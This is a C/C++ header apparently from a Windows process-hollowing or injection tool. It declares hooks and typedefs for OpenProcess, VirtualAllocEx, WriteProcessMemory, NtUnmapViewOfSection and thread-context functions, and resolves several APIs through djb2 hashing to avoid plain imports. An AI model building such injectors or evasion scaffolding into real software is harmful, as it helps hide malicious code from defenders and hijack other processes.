#pragma once
#include "../Hooking/ldr.h"
#include "../Hooking/hook.h"
#include "PE.h"
#pragma warning(disable : 4996)


HANDLE hProcess = NULL;
PPEB pPEB = NULL;


struct PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	DWORD PebBaseAddress;
	PVOID Reserved2[2];
	DWORD UniqueProcessId;
	PVOID Reserved3;
};

typedef NTSTATUS(NTAPI* _NtUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
	HANDLE ProcessHandle,
	DWORD ProcessInformationClass,
	PVOID ProcessInformation,
	DWORD ProcessInformationLength,
	PDWORD ReturnLength
	);


HANDLE OpenProcess_engine(DWORD pid);

typedef  HANDLE(WINAPI* _OpenProcess)(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
	);


HANDLE WINAPI _hookOpenProcess(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
);

_OpenProcess _orginalOpenProcess = NULL; 

HANDLE OpenThread_engine(DWORD tid);

typedef  HANDLE(WINAPI* _OpenThread)(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
	);

HANDLE WINAPI _hookOpenThread(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
);

_OpenThread _orginalOpenThread = NULL;


HANDLE CreateFileA_engine();

typedef  HANDLE(WINAPI* _CreateFileA)(
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
	);

HANDLE WINAPI _hookCreateFileA(
	LPCSTR                lpFileName,
	DWORD                 dwDesiredAccess,
	DWORD                 dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD                 dwCreationDisposition,
	DWORD                 dwFlagsAndAttributes,
	HANDLE                hTemplateFile
);

_CreateFileA _orginalCreateFileA = NULL;


PBYTE ReadFile_engine(HANDLE hFile);

typedef  BOOL(WINAPI* _ReadFile)(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
);


BOOL WINAPI _hookReadFile(
	HANDLE       hFile,
	LPVOID       lpBuffer,
	DWORD        nNumberOfBytesToRead,
	LPDWORD      lpNumberOfBytesRead,
	LPOVERLAPPED lpOverlapped
	);

_ReadFile _orginalReadFile = NULL;

__forceinline DWORD WINAPI pGetFileSize(
	HANDLE  hFile,
	LPDWORD lpFileSizeHigh
)
{
	DWORD(WINAPI * pFunction)(HANDLE, LPDWORD);
	pFunction = (DWORD(WINAPI*)(HANDLE, LPDWORD))_initialize(djb2_values[1], "GetFileSize",0);
	return pFunction(hFile, lpFileSizeHigh);
}


PVOID VirtualAllocEx_engine(DWORD SizeOfImage);


typedef  LPVOID(WINAPI* _VirtualAllocEx)(
	HANDLE hprocess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);


LPVOID WINAPI _hookVirtualAllocEx(
	HANDLE hprocess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);

_VirtualAllocEx _orginalVirtualAllocEx = NULL;


BOOL WriteProcessMemory_engine(HANDLE  hprocess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten);

typedef  BOOL(WINAPI* _WriteProcessMemory) (
	HANDLE  hprocess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
);

BOOL WINAPI _hookWriteProcessMemory (
	HANDLE  hprocess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
);

_WriteProcessMemory _orginalWriteProcessMemory = NULL;


DWORD ReadProcessMemory_engine(PVOID pBaseAddress);


typedef  BOOL(WINAPI* _ReadProcessMemory)(
	HANDLE  hprocess,
	LPCVOID lpBaseAddress,
	LPVOID  lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesRead
	);

BOOL WINAPI _hookReadProcessMemory(
	HANDLE  hprocess,
	LPCVOID lpBaseAddress,
	LPVOID  lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesRead
);

_ReadProcessMemory _orginalReadProcessMemory = NULL;  

__forceinline BOOL WINAPI pReadProcessMemory(
	HANDLE  hProcess,
	LPCVOID lpBaseAddress,
	LPVOID  lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesRead
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*))_initialize(djb2_values[1], "ReadProcessMemory",0);
	return pFunction(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesRead);
}
__forceinline BOOL WINAPI pGetThreadContext(
	HANDLE    hThread,
	LPCONTEXT lpContext
)
{
	BOOL(WINAPI * pFunction)(HANDLE, LPCONTEXT);
	pFunction = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))_initialize(djb2_values[1], "GetThreadContext",0);
	return pFunction(hThread, lpContext);
}

__forceinline BOOL WINAPI pSetThreadContext(
	HANDLE        hThread,
	const CONTEXT* lpContext
)
{
	BOOL(WINAPI * pFunction)(HANDLE, const CONTEXT*);
	pFunction = (BOOL(WINAPI*)(HANDLE, const CONTEXT*))_initialize(djb2_values[1], "SetThreadContext",0);
	return pFunction(hThread, lpContext);
}

__forceinline DWORD WINAPI pResumeThread(
	HANDLE hThread
)
{
	DWORD(WINAPI * pFunction)(HANDLE);
	pFunction = (DWORD(WINAPI*)(HANDLE))_initialize(djb2_values[1], "ResumeThread",0);
	return pFunction(hThread);
}
